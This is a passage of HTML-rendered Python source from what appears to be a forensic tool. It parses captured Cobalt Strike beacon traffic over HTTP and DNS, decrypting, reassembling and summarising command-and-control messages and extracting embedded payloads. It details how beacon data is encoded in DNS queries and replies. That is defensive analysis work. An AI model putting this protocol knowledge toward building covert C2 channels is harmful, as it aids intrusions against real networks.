class="keyword">raise</span></span><br><span class="line">            self.oOutput.Line(<span class="string">'HMAC signature invalid'</span>)</span><br><span class="line">            self.oOutput.Line(<span class="string">''</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">if</span> data == <span class="string">b''</span>:</span><br><span class="line">            self.oOutput.Line(<span class="string">'No data'</span>)</span><br><span class="line">        <span class="keyword">elif</span> data.startswith(<span class="string">b'MZ'</span>):</span><br><span class="line">            self.oOutput.Line(<span class="string">'MZ payload detected'</span>)</span><br><span class="line">            self.oOutput.Line(<span class="string">' MD5: '</span> + hashlib.md5(data).hexdigest())</span><br><span class="line">            self.ExtractPayload(data)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            oStructData = cStruct(data)</span><br><span class="line">            timestamp, datasize = oStructData.Unpack(<span class="string">'&gt;II'</span>)</span><br><span class="line">            self.oOutput.Line(<span class="string">'Timestamp: %d %s'</span> % (timestamp, self.FormatTime(timestamp)))</span><br><span class="line">            self.oOutput.Line(<span class="string">'Data size: %d'</span> % datasize)</span><br><span class="line">            oStructData.Truncate(datasize)</span><br><span class="line">            <span class="keyword">while</span> oStructData.Length() &gt; <span class="number">0</span>:</span><br><span class="line">                command, argslen = oStructData.Unpack(<span class="string">'&gt;II'</span>)</span><br><span class="line">                self.dCommandsSummary[command] = self.dCommandsSummary.get(command, <span class="number">0</span>) + <span class="number">1</span></span><br><span class="line">                self.oOutput.Line(<span class="string">'Command: %d %s'</span> % (command, self.LookupCommand(command)))</span><br><span class="line">                <span class="keyword">if</span> command == __class__.BEACON_COMMAND_SLEEP:</span><br><span class="line">                    sleep, jitter = oStructData.Unpack(<span class="string">'&gt;II'</span>)</span><br><span class="line">                    self.oOutput.Line(<span class="string">' Sleep: %d'</span> % sleep)</span><br><span class="line">                    self.oOutput.Line(<span class="string">' Jitter: %d'</span> % jitter)</span><br><span class="line">                <span class="keyword">elif</span> command == __class__.BEACON_COMMAND_DATA_JITTER:</span><br><span class="line">                    self.oOutput.Line(<span class="string">' Length random data = %d'</span> % argslen)</span><br><span class="line">                    payload = oStructData.GetBytes(argslen)</span><br><span class="line">                <span class="keyword">elif</span> command == __class__.BEACON_COMMAND_RUN:</span><br><span class="line">                    self.oOutput.Line(<span class="string">' Command: %s'</span> % oStructData.GetString(<span class="string">'&gt;I'</span>))</span><br><span class="line">                    self.oOutput.Line(<span class="string">' Arguments: %s'</span> % oStructData.GetString(<span class="string">'&gt;I'</span>))</span><br><span class="line">                    self.oOutput.Line(<span class="string">' Integer: %d'</span> % oStructData.Unpack(<span class="string">'&gt;H'</span>))</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    self.oOutput.Line(<span class="string">' Arguments length: %d'</span> % argslen)</span><br><span class="line">                    <span class="keyword">if</span> argslen &gt; <span class="number">0</span>:</span><br><span class="line">                        <span class="keyword">if</span> command <span class="keyword">in</span> [<span class="number">40</span>, <span class="number">62</span>]:</span><br><span class="line">                            oStructCommand = cStruct(oStructData.GetBytes(argslen))</span><br><span class="line">                            self.oOutput.Line(<span class="string">' Unknown1: %d'</span> % oStructCommand.Unpack(<span class="string">'&gt;I'</span>))</span><br><span class="line">                            self.oOutput.Line(<span class="string">' Unknown2: %d'</span> % oStructCommand.Unpack(<span class="string">'&gt;I'</span>))</span><br><span class="line">                            self.oOutput.Line(<span class="string">' Pipename: %s'</span> % oStructCommand.GetString(<span class="string">'&gt;I'</span>))</span><br><span class="line">                            self.oOutput.Line(<span class="string">' Command: %s'</span> % oStructCommand.GetString(<span class="string">'&gt;I'</span>))</span><br><span class="line">                            self.oOutput.Line(<span class="string">' '</span> + repr(oStructCommand.GetBytes()))</span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            payload = oStructData.GetBytes(argslen)</span><br><span class="line">                            self.oOutput.Line(<span class="string">' '</span> + repr(payload[:argslen])[:<span class="number">100</span>])</span><br><span class="line">                            self.oOutput.Line(<span class="string">' MD5: '</span> + hashlib.md5(payload).hexdigest())</span><br><span class="line">                            self.ExtractPayload(payload)</span><br><span class="line"></span><br><span class="line">        self.oOutput.Line(<span class="string">''</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">AnalyzeCaptureHTTP</span><span class="params">(filename, options)</span>:</span></span><br><span class="line">    oOutput = InstantiateCOutput(options)</span><br><span class="line">    oCSParser = cCSParser(options.rawkey, options.hmacaeskeys, <span class="literal">True</span>, <span class="literal">True</span>, options.transform, options.extract, oOutput)</span><br><span class="line">    dMethods = &#123;&#125;</span><br><span class="line"></span><br><span class="line">    capture = pyshark.FileCapture(filename, display_filter=options.displayfilter, use_json=<span class="literal">True</span>, include_raw=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">for</span> packet <span class="keyword">in</span> capture:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> hasattr(packet, <span class="string">'http'</span>):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> hasattr(packet.http, <span class="string">'request'</span>) <span class="keyword">and</span> packet.http.has_field(<span class="string">'1\\r\\n'</span>): <span class="comment"># this is a bug in PyShark, should be fieldname request</span></span><br><span class="line">            dMethods[packet.number] = packet.http.get_field(<span class="string">'1\\r\\n'</span>).method</span><br><span class="line"></span><br><span class="line">        data_raw = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">if</span> hasattr(packet.http, <span class="string">'file_data_raw'</span>):</span><br><span class="line">            data_raw = packet.http.file_data_raw</span><br><span class="line">        <span class="keyword">elif</span> hasattr(packet.http, <span class="string">'content-encoded_entity_body_(gzip)'</span>):</span><br><span class="line">            data_raw = getattr(packet.http, <span class="string">'content-encoded_entity_body_(gzip)'</span>).data.data_raw</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> hasattr(packet.http, <span class="string">'response'</span>):</span><br><span class="line">            oOutput.Line(<span class="string">'Packet number: %d'</span> % packet.number)</span><br><span class="line">            <span class="keyword">if</span> hasattr(packet.http, <span class="string">'request_in'</span>) <span class="keyword">and</span> len(packet.http.request_in.fields) &gt; <span class="number">0</span>:</span><br><span class="line">                requestPacket = packet.http.request_in.fields[<span class="number">0</span>].int_value</span><br><span class="line">                oOutput.Line(<span class="string">'HTTP response (for request %d %s)'</span> % (requestPacket, dMethods.get(requestPacket, <span class="string">''</span>)))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                oOutput.Line(<span class="string">'HTTP response'</span>)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                oCSParser.ProcessReplyPacketData(data_raw[<span class="number">0</span>])</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                oOutput.Line(<span class="string">'* An error occured1'</span>)</span><br><span class="line">                oOutput.Line(e)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> hasattr(packet.http, <span class="string">'request'</span>):</span><br><span class="line">            oOutput.Line(<span class="string">'Packet number: %d'</span> % packet.number)</span><br><span class="line">            oOutput.Line(<span class="string">'HTTP request %s'</span> % dMethods.get(packet.number, <span class="string">''</span>))</span><br><span class="line">            <span class="keyword">if</span> hasattr(packet.http, <span class="string">'request_full_uri'</span>):</span><br><span class="line">                oOutput.Line(packet.http.request_full_uri)</span><br><span class="line">            <span class="keyword">elif</span> hasattr(packet.http, <span class="string">'full_uri'</span>):</span><br><span class="line">                oOutput.Line(packet.http.full_uri)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                oOutput.Line(<span class="string">"No URI field found"</span>)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                oCSParser.ProcessPostPacketData(data_raw[<span class="number">0</span>])</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                oOutput.Line(<span class="string">'* An error occured1'</span>)</span><br><span class="line">                oOutput.Line(e)</span><br><span class="line"></span><br><span class="line">    capture.close()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> len(oCSParser.dCommandsSummary) &gt; <span class="number">0</span>:</span><br><span class="line">        oOutput.Line(<span class="string">'Commands summary:'</span>)</span><br><span class="line">        <span class="keyword">for</span> command, counter <span class="keyword">in</span> sorted(oCSParser.dCommandsSummary.items()):</span><br><span class="line">            oOutput.Line(<span class="string">' %d %s: %d'</span> % (command, oCSParser.LookupCommand(command), counter))</span><br><span class="line"></span><br><span class="line">    oOutput.Line(<span class="string">''</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> len(oCSParser.dCallbacksSummary) &gt; <span class="number">0</span>:</span><br><span class="line">        oOutput.Line(<span class="string">'Callbacks summary:'</span>)</span><br><span class="line">        <span class="keyword">for</span> callback, counter <span class="keyword">in</span> sorted(oCSParser.dCallbacksSummary.items()):</span><br><span class="line">            oOutput.Line(<span class="string">' %d %s: %d'</span> % (callback, oCSParser.LookupCallback(callback), counter))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">IsNumber</span><span class="params">(data)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> data:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> a <span class="keyword">in</span> <span class="string">'0123456789'</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">IsHexNumber</span><span class="params">(data)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> data.lower():</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> a <span class="keyword">in</span> <span class="string">'0123456789abcdef'</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">StartsWithGetRemainder</span><span class="params">(strIn, strStart)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> strIn.startswith(strStart):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span>, strIn[len(strStart):]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span>, <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">EndsWithGetRemainder</span><span class="params">(strIn, strEnd)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> strIn.endswith(strEnd):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span>, strIn[:-len(strEnd)]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span>, <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">IPv4ToHex</span><span class="params">(ipv4)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join([<span class="string">'%02x'</span> % int(number) <span class="keyword">for</span> number <span class="keyword">in</span> ipv4.split(<span class="string">'.'</span>)])</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cParts</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, dnsidle=<span class="string">''</span>)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> dnsidle == <span class="string">''</span>:</span><br><span class="line">            self.dnsidle = <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.dnsidle = int(IPv4ToHex(dnsidle), <span class="number">16</span>)</span><br><span class="line">        self.Init()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Init</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.dParts = &#123;&#125;</span><br><span class="line">        self.size = <span class="literal">None</span></span><br><span class="line">        self.identifier = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Add</span><span class="params">(self, counter, value)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> counter.startswith(<span class="string">'0'</span>):</span><br><span class="line">            self.identifier = counter[<span class="number">1</span>:]</span><br><span class="line">            self.size = int(self.Convert1(value), <span class="number">16</span>) ^ self.dnsidle</span><br><span class="line">            self.dParts = &#123;&#125;</span><br><span class="line">        <span class="keyword">elif</span> self.identifier == <span class="literal">None</span>:</span><br><span class="line">            self.Init()</span><br><span class="line">        <span class="keyword">elif</span> counter.endswith(self.identifier):</span><br><span class="line">            self.dParts[int(counter, <span class="number">16</span>)] = value</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Assemble</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> self.identifier == <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        numbers = sorted(self.dParts.keys())</span><br><span class="line">        data = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> number <span class="keyword">in</span> numbers:</span><br><span class="line">            data += <span class="string">''</span>.join(self.Convert2(self.dParts[number]))</span><br><span class="line">        data = self.Convert3(data)</span><br><span class="line">        <span class="keyword">if</span> len(data) == self.size * <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">return</span> data</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cPartsIPv4</span><span class="params">(cParts)</span>:</span></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Convert1</span><span class="params">(data)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> IPv4ToHex(data)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Convert2</span><span class="params">(data)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> IPv4ToHex(data)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Convert3</span><span class="params">(data)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">IPv6ToHex</span><span class="params">(ipv6)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> ipaddress.ip_address(ipv6).exploded.replace(<span class="string">':'</span>, <span class="string">''</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cPartsIPv6</span><span class="params">(cParts)</span>:</span></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Convert1</span><span class="params">(data)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> IPv4ToHex(data)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Convert2</span><span class="params">(data)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> IPv6ToHex(data)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Convert3</span><span class="params">(data)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cPartsTXT</span><span class="params">(cParts)</span>:</span></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Convert1</span><span class="params">(data)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> IPv4ToHex(data)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Convert2</span><span class="params">(data)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Convert3</span><span class="params">(data)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            decoded = binascii.a2b_base64(data)</span><br><span class="line">        <span class="keyword">except</span> binascii.Error:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">''</span></span><br><span class="line">        <span class="keyword">return</span> binascii.b2a_hex(decoded).decode()</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cPartsLabels</span><span class="params">(cParts)</span>:</span></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Convert1</span><span class="params">(data)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> data[<span class="number">0</span>][<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Convert2</span><span class="params">(data)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span>.join(data)[<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Convert3</span><span class="params">(data)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CheckForBeacon</span><span class="params">(labels, dBeacons)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> position, label <span class="keyword">in</span> enumerate(labels):</span><br><span class="line">        <span class="keyword">if</span> label <span class="keyword">in</span> dBeacons:</span><br><span class="line">            <span class="keyword">return</span> labels[:position]</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">AnalyzeCaptureDNS</span><span class="params">(filename, options)</span>:</span></span><br><span class="line">    oOutput = InstantiateCOutput(options)</span><br><span class="line">    oCSParser = cCSParser(options.rawkey, options.hmacaeskeys, <span class="literal">True</span>, <span class="literal">False</span>, <span class="string">''</span>, options.extract, oOutput)</span><br><span class="line"></span><br><span class="line">    dBeacons = &#123;&#125;</span><br><span class="line">    oPartsLabels = cPartsLabels()</span><br><span class="line">    oPartsIPv4 = cPartsIPv4(options.dnsidle)</span><br><span class="line">    oPartsIPv6 = cPartsIPv6(options.dnsidle)</span><br><span class="line">    oPartsTXT = cPartsTXT(options.dnsidle)</span><br><span class="line">    dPings = &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> options.beaconid != <span class="string">''</span>:</span><br><span class="line">        dBeacons[options.beaconid.lower()] = <span class="string">'option'</span></span><br><span class="line">    capture = pyshark.FileCapture(filename, display_filter=options.displayfilter, use_json=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">for</span> packet <span class="keyword">in</span> capture:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> hasattr(packet, <span class="string">'dns'</span>):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> hasattr(packet.dns, <span class="string">'flags'</span>):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        linePacket = <span class="string">'Packet: %s %d'</span> % (packet.sniff_time, packet.number)</span><br><span class="line">        <span class="keyword">if</span> int(packet.dns.flags, <span class="number">16</span>) &amp; <span class="number">0x8000</span> == <span class="number">0x0000</span>:</span><br><span class="line">            <span class="keyword">if</span> hasattr(packet.dns, <span class="string">'Queries'</span>):</span><br><span class="line">                name = <span class="string">''</span></span><br><span class="line">                <span class="keyword">for</span> shortname <span class="keyword">in</span> packet.dns.Queries.field_names:</span><br><span class="line">                    fullname = packet.dns.Queries.get_field(shortname).name</span><br><span class="line">                    <span class="keyword">if</span> len(fullname) &gt; len(name):</span><br><span class="line">                        name = fullname</span><br><span class="line">                labels = name.split(<span class="string">'.'</span>)</span><br><span class="line">                <span class="keyword">if</span> IsHexNumber(labels[<span class="number">0</span>]) <span class="keyword">and</span> int(labels[<span class="number">0</span>], <span class="number">16</span>) &amp; <span class="number">0x4B2</span> == <span class="number">0x4B2</span>:</span><br><span class="line">                    oOutput.Line(linePacket)</span><br><span class="line">                    oOutput.Line(<span class="string">'packet.dns.flags: %x'</span> % int(packet.dns.flags, <span class="number">16</span>))</span><br><span class="line">                    print(<span class="string">'Beacon V4 ping found: %s'</span> % name)</span><br><span class="line">                    dBeacons[labels[<span class="number">0</span>]] = <span class="string">'V4'</span></span><br><span class="line">                    dPings[packet.number] = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">elif</span> IsNumber(labels[<span class="number">0</span>]):</span><br><span class="line">                    oOutput.Line(linePacket)</span><br><span class="line">                    oOutput.Line(<span class="string">'packet.dns.flags: %x'</span> % int(packet.dns.flags, <span class="number">16</span>))</span><br><span class="line">                    print(<span class="string">'Beacon V3 ping found: %s'</span> % name)</span><br><span class="line">                    dBeacons[labels[<span class="number">0</span>]] = <span class="string">'V3'</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    csquery = CheckForBeacon(labels, dBeacons)</span><br><span class="line">                    <span class="keyword">if</span> csquery != <span class="literal">None</span>:</span><br><span class="line">                        <span class="keyword">if</span> csquery == []:</span><br><span class="line">                            <span class="keyword">pass</span></span><br><span class="line">                        <span class="keyword">elif</span> csquery[<span class="number">0</span>] == <span class="string">'www'</span>:</span><br><span class="line">                            oOutput.Line(linePacket)</span><br><span class="line">                            print(<span class="string">'Beacon checkin: %s'</span> % name)</span><br><span class="line">                            oPartsLabels.Add(csquery[<span class="number">-1</span>], csquery[<span class="number">1</span>:<span class="number">-1</span>])</span><br><span class="line">                            encryptedMetadata = oPartsLabels.Assemble()</span><br><span class="line">                            <span class="keyword">if</span> encryptedMetadata != <span class="literal">None</span>:</span><br><span class="line">                                print(<span class="string">'encryptedMetadata: '</span> + encryptedMetadata)</span><br><span class="line">                                print(<span class="string">'encryptedMetadata BASE64: '</span> + binascii.b2a_base64(binascii.a2b_hex(encryptedMetadata)).decode())</span><br><span class="line">                        <span class="keyword">elif</span> csquery[<span class="number">0</span>] <span class="keyword">in</span> [<span class="string">'cdn'</span>, <span class="string">'api'</span>]:</span><br><span class="line">                            oOutput.Line(linePacket)</span><br><span class="line">                            print(<span class="string">'Beacon GET: %s'</span> % name)</span><br><span class="line">                        <span class="keyword">elif</span> csquery[<span class="number">0</span>] == <span class="string">'post'</span>:</span><br><span class="line">                            oOutput.Line(linePacket)</span><br><span class="line">                            print(<span class="string">'Beacon POST: %s'</span> % name)</span><br><span class="line">                            oPartsLabels.Add(csquery[<span class="number">-1</span>], csquery[<span class="number">1</span>:<span class="number">-1</span>])</span><br><span class="line">                            postData  = oPartsLabels.Assemble()</span><br><span class="line">                            <span class="keyword">if</span> postData != <span class="literal">None</span>:</span><br><span class="line">                                print(<span class="string">'-'</span> * <span class="number">100</span>)</span><br><span class="line">                                print(<span class="string">'postData: '</span> + postData)</span><br><span class="line">                                oCSParser.ProcessPostPacketData(postData)</span><br><span class="line">                                print(<span class="string">'-'</span> * <span class="number">100</span>)</span><br><span class="line">                print(<span class="string">''</span>)</span><br><span class="line">            </span><br><span class="line">        <span class="keyword">if</span> int(packet.dns.flags, <span class="number">16</span>) &amp; <span class="number">0x8000</span> == <span class="number">0x8000</span>:</span><br><span class="line">            <span class="keyword">if</span> hasattr(packet.dns, <span class="string">'Answers'</span>):</span><br><span class="line">                <span class="keyword">for</span> name <span class="keyword">in</span> packet.dns.Answers.field_names:</span><br><span class="line">                    labels = name.split(<span class="string">'.'</span>)</span><br><span class="line">                    csquery = CheckForBeacon(labels, dBeacons)</span><br><span class="line">                    <span class="keyword">if</span> csquery != <span class="literal">None</span>:</span><br><span class="line">                        <span class="keyword">if</span> csquery == []:</span><br><span class="line">                            <span class="keyword">if</span> hasattr(packet.dns, <span class="string">'response_to'</span>) <span class="keyword">and</span> packet.dns.response_to.fields[<span class="number">0</span>].int_value <span class="keyword">in</span> dPings:</span><br><span class="line">                                <span class="keyword">if</span> hasattr(packet.dns.Answers.get_field(name), <span class="string">'a'</span>):</span><br><span class="line">                                    <span class="keyword">if</span> options.dnsidle == <span class="string">''</span>:</span><br><span class="line">                                        xormask = <span class="number">0</span></span><br><span class="line">                                    <span class="keyword">else</span>:</span><br><span class="line">                                        xormask = int(IPv4ToHex(options.dnsidle), <span class="number">16</span>)</span><br><span class="line">                                    intIPv4 = int(IPv4ToHex(packet.dns.Answers.get_field(name).a), <span class="number">16</span>) ^ xormask</span><br><span class="line">                                    <span class="keyword">if</span> intIPv4 &gt;= <span class="number">240</span> <span class="keyword">and</span> intIPv4 &lt;= <span class="number">255</span>:</span><br><span class="line">                                        oOutput.Line(linePacket)</span><br><span class="line">                                        print(<span class="string">'Reply to beacon V4 ping found: %d'</span> % intIPv4)</span><br><span class="line">                                        <span class="keyword">if</span> intIPv4 &amp; <span class="number">1</span> == <span class="number">1</span>:</span><br><span class="line">                                            print(<span class="string">'Checkin requested'</span>)</span><br><span class="line">                                        <span class="keyword">if</span> intIPv4 &amp; <span class="number">0x0E</span> == <span class="number">0</span>:</span><br><span class="line">                                            print(<span class="string">'mode dns'</span>)</span><br><span class="line">                                        <span class="keyword">if</span> intIPv4 &amp; <span class="number">0x0E</span> == <span class="number">2</span>:</span><br><span class="line">                                            print(<span class="string">'mode dns-txt'</span>)</span><br><span class="line">                                        <span class="keyword">if</span> intIPv4 &amp; <span class="number">0x0E</span> == <span class="number">4</span>:</span><br><span class="line">                                            print(<span class="string">'mode dns6'</span>)</span><br><span class="line">                                        print(<span class="string">''</span>)</span><br><span class="line">                        <span class="keyword">elif</span> labels[<span class="number">0</span>] == <span class="string">'cdn'</span>:</span><br><span class="line">                            oOutput.Line(linePacket)</span><br><span class="line">                            oPartsIPv4.Add(csquery[<span class="number">-1</span>], packet.dns.Answers.get_field(name).a)</span><br><span class="line">                            print(packet.dns.Answers.get_field(name).name)</span><br><span class="line">                            print(packet.dns.Answers.get_field(name).a)</span><br><span class="line">                            replyData = oPartsIPv4.Assemble()</span><br><span class="line">                            <span class="keyword">if</span> replyData != <span class="literal">None</span>:</span><br><span class="line">                                print(<span class="string">'-'</span> * <span class="number">100</span>)</span><br><span class="line">                                print(<span class="string">'replyData: '</span> + replyData)</span><br><span class="line">                                oCSParser.ProcessReplyPacketData(replyData)</span><br><span class="line">                                print(<span class="string">'-'</span> * <span class="number">100</span>)</span><br><span class="line">                            print(<span class="string">''</span>)</span><br><span class="line">                        <span class="keyword">elif</span> labels[<span class="number">0</span>] == <span class="string">'api'</span>:</span><br><span class="line">                            oOutput.Line(linePacket)</span><br><span class="line">                            <span class="keyword">if</span> hasattr(packet.dns.Answers.get_field(name), <span class="string">'a'</span>):</span><br><span class="line">                                oPartsTXT.Add(csquery[<span class="number">-1</span>], packet.dns.Answers.get_field(name).a)</span><br><span class="line">                                print(packet.dns.Answers.get_field(name).a)</span><br><span class="line">                            <span class="keyword">elif</span> hasattr(packet.dns.Answers.get_field(name), <span class="string">'txt'</span>):</span><br><span class="line">                                print(<span class="string">'TXT record content: %s'</span> % packet.dns.Answers.get_field(name).txt)</span><br><span class="line">                                oPartsTXT.Add(csquery[<span class="number">-1</span>], packet.dns.Answers.get_field(name).txt)</span><br><span class="line">                                replyData = oPartsTXT.Assemble()</span><br><span class="line">                                <span class="keyword">if</span> replyData != <span class="literal">None</span>:</span><br><span class="line">                                    print(<span class="string">'-'</span> * <span class="number">100</span>)</span><br><span class="line">                                    print(<span class="string">'replyData: '</span> + replyData)</span><br><span class="line">                                    oCSParser.ProcessReplyPacketData(replyData)</span><br><span class="line">                                    print(<span class="string">'-'</span> * <span class="number">100</span>)</span><br><span class="line">                        <span class="keyword">elif</span> labels[<span class="number">0</span>] == <span class="string">'www6'</span>:</span><br><span class="line">                            oOutput.Line(linePacket)</span><br><span class="line">                            <span class="keyword">if</span> hasattr(packet.dns.Answers.get_field(name), <span class="string">'a'</span>):</span><br><span class="line">                                oPartsIPv6.Add(csquery[<span class="number">-1</span>], packet.dns.Answers.get_field(name).a)</span><br><span class="line">                                print(packet.dns.Answers.get_field(name).a)</span><br><span class="line">                            <span class="keyword">elif</span> hasattr(packet.dns.Answers.get_field(name), <span class="string">'aaaa'</span>):</span><br><span class="line">                                oPartsIPv6.Add(csquery[<span class="number">-1</span>], packet.dns.Answers.get_field(name).aaaa)</span><br><span class="line">                                replyData = oPartsIPv6.Assemble()</span><br><span class="line">                                <span class="keyword">if</span> replyData != <span class="literal">None</span>:</span><br><span class="line">                                    print(<span class="string">'-'</span> * <span class="number">100</span>)</span><br><span class="line">                                    print(<span class="string">'replyData: '</span> + replyData)</span><br><span class="line">                                    oCSParser.ProcessReplyPacketData(replyData)</span><br><span class="line">                                    print(<span class="string">'-'</span> * <span class="number">100</span>)</span><br><span class="line"></span><br><span class="line">    capture.close()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> len(oCSParser.dCommandsSummary) &gt; <span class="number">0</span>:</span><br><span class="line">        oOutput.Line(<span class="string">'Commands summary:'</span>)</span><br><span class="line">        <span class="keyword">for</span> command, counter <span class="keyword">in</span> sorted(oCSParser.dCommandsSummary.items()):</span><br><span class="line">            oOutput.Line(<span class="string">' %d %s: %d'</span> % (command, oCSParser.LookupCommand(command), counter))</span><br><span 